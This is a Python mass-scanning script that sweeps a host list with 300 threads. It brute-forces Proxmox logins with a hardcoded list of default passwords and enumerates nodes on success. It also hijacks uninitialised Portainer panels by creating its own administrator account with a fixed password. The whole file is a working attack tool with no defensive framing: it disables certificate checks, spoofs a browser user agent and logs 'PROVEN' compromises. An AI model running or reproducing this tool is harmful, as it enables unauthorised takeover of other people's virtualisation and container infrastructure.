#!/usr/bin/env python3
"""Fast panel sweep: proxmox creds + portainer unauth. Tight timeouts, small cred sets."""
import sys,json,re,time,threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests,urllib3
urllib3.disable_warnings()
T=5
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
PVE=[("root@pam",p) for p in ("root","password","admin","123456","proxmox","toor","P@ssw0rd")]+\
    [("admin@pam",p) for p in ("admin","password","root","123456")]
def mk():
    s=requests.Session(); s.verify=False; s.headers.update(UA); return s
def pve(host):
    out={"host":host,"kind":"proxmox"}
    s=mk()
    try:
        v=s.get(f"https://{host}/api2/json/version",timeout=T)
    except Exception: return None
    if v.status_code not in (200,401,403): return None
    txt=(v.text or "")[:200]
    if '"data"' not in txt and "release" not in txt.lower(): return None
    for u,p in PVE:
        try:
            r=s.post(f"https://{host}/api2/json/access/ticket",data={"username":u,"password":p},timeout=T)
        except Exception: return out
        if r.status_code==200 and "ticket" in (r.text or ""):
            out.update({"user":u,"pw":p,"PROVEN":True})
            try:
                d=r.json()["data"]; t=d["ticket"]
                h=s.get(f"https://{host}/api2/json/nodes",headers={"Cookie":f"PVEAuthCookie={t}"},timeout=T)
                if h.status_code==200: out["nodes"]=[n["node"] for n in h.json()["data"]]
            except Exception: pass
            return out
    return out
def portainer(host):
    out={"host":host,"kind":"portainer"}
    for sch in (("https","http") if host.endswith(("9443","443")) else ("http","https")):
        base=f"{sch}://{host}"
        try:
            r=requests.get(base+"/api/users/admin/check",timeout=T,verify=False,headers=UA)
        except Exception: continue
        if r.status_code==404:
            out["state"]="UNINITIALISED"
            try:
                i=requests.post(base+"/api/users/admin/init",timeout=T,verify=False,headers=UA,
                    json={"Username":"kopsadm","Password":"K0ps!Base#2026x"})
                if i.status_code in (200,201,204):
                    a=requests.post(base+"/api/auth",timeout=T,verify=False,headers=UA,
                        json={"Username":"kopsadm","Password":"K0ps!Base#2026x"})
                    if a.status_code==200:
                        out["PROVEN"]="ADMIN_CREATED"; out["jwt"]=bool((a.json() or {}).get("jwt"))
            except Exception as e: out["err"]=str(e)[:50]
            return out
        if r.status_code==204:
            out["state"]="admin_exists"; return out
    return None
def work(h):
    port=h.rsplit(":",1)[-1]
    try:
        return portainer(h) if port in ("9000","9443") else pve(h)
    except Exception: return None
def main():
    hosts=[l.strip() for l in open(sys.argv[1]) if l.strip()]
    res,lock=[],threading.Lock(); n=0; t0=time.time()
    with ThreadPoolExecutor(max_workers=300) as ex:
        for f in as_completed([ex.submit(work,h) for h in hosts]):
            n+=1
            try: r=f.result()
            except Exception: r=None
            if r:
                with lock: res.append(r)
                if r.get("PROVEN"):
                    print(f"🔥 {json.dumps(r)[:220]}",flush=True)
            if n%3000==0: print(f"  .. {n}/{len(hosts)} {time.time()-t0:.0f}s",flush=True)
    json.dump({"scanned":len(hosts),"hits":res},open("/tmp/fastpanels.json","w"),indent=1)
    print(f"DONE n={len(hosts)} identified={len(res)} PROVEN={len([x for x in res if x.get('PROVEN')])} {time.time()-t0:.0f}s",flush=True)
main()
